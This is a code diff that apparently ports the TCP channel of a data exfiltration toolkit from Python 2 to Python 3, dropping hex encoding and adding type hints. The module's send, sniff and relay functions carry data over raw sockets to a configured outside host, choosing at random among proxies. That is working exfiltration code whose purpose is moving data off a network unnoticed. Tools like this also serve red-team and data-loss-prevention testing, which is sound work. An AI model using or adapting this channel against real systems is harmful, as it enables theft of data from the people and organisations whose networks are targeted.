@@ -5,7 +5,7 @@ from random import choice
 config = None
 app_exfiltrate = None
 
-def send(data):
+def send(data: str):
     if 'proxies' in config and config['proxies'] != [""]:
         targets = [config['target']] + config['proxies']
         target = choice(targets)
@@ -16,7 +16,7 @@ def send(data):
         'info', "[tcp] Sending {0} bytes to {1}".format(len(data), target))
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client_socket.connect((target, port))
-    client_socket.send(data.encode('hex'))
+    client_socket.send(data.encode())
     client_socket.close()
 
 def listen():
@@ -44,12 +44,11 @@ def sniff(handler):
             app_exfiltrate.log_message(
                 'info', "[tcp] client connected: {}".format(client_address))
             while True:
-                data = connection.recv(65535)
+                data: bytes = connection.recv(65535)
                 if data:
                     app_exfiltrate.log_message(
                         'info', "[tcp] Received {} bytes".format(len(data)))
                     try:
-                        data = data.decode('hex')
                         handler(data)
                     except Exception as e:
                         app_exfiltrate.log_message(
@@ -59,14 +58,14 @@ def sniff(handler):
         finally:
             connection.close()
 
-def relay_tcp_packet(data):
+def relay_tcp_packet(data: bytes):
     target = config['target']
     port = config['port']
     app_exfiltrate.log_message(
         'info', "[proxy] [tcp] Relaying {0} bytes to {1}".format(len(data), target))
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client_socket.connect((target, port))
-    client_socket.send(data.encode('hex'))
+    client_socket.send(data)
     client_socket.close()
 
 def proxy():
